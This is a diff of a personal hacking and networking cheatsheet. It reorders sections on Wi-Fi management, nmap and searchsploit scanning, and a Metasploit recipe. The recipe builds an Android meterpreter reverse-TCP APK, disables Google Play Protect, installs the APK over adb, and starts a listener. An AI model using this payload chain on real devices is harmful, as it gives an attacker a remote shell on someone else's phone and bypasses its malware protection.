@@ -1,23 +1,5 @@
 https://medium.com/nybles/exploring-android-hacking-with-metasploit-framework-2306c3511698
-
-## Network Analysis  
-nmap -sn 192.168.1.*  
-nmap {ips} -A -oX hosts.xml  
-searchsploit --nmap hosts.xml --json 2>&1 | tee result.json  
-   
-## MSF EZ Cheatsheet  
-msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.110.126 LPORT=4444 -o android_client.apk  
   
-disable Google Protect  
-adb connect 192.168.110.230  
-adb push android_client.apk /storage/self/primary  
-  
-msfconsole  
-set PAYLOAD multi/handler  
-set LHOST 192.168.110.126  
-set LPORT 4444  
-exploit  
-
 ## Wi-Fi Cheatsheet
 
 sudo iwlist wlan0 scan  
@@ -58,7 +40,28 @@ nmcli d disconnect <WifiInterface>
 nmcli c up <SavedWiFiConn>  
 nmcli c down <SavedWiFiConn>  
   
+## Network Analysis  
+nmap -sn 192.168.1.*  
+nmap {ips} -A -oX hosts.xml  
+searchsploit --nmap hosts.xml --json 2>&1 | tee result.json  
+   
+## MSF EZ Cheatsheet  
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.110.126 LPORT=4444 -o android_client.apk  
   
+disable Google Protect  
+adb connect 192.168.110.230  
+adb push android_client.apk /storage/self/primary  
+  
+msfconsole  
+set PAYLOAD multi/handler  
+set LHOST 192.168.110.126  
+set LPORT 4444  
+exploit  
+  
+  
+  
+
+/etc/network/interfaces  i.e.:  
 auto lo  
 iface lo inet loopback  
   
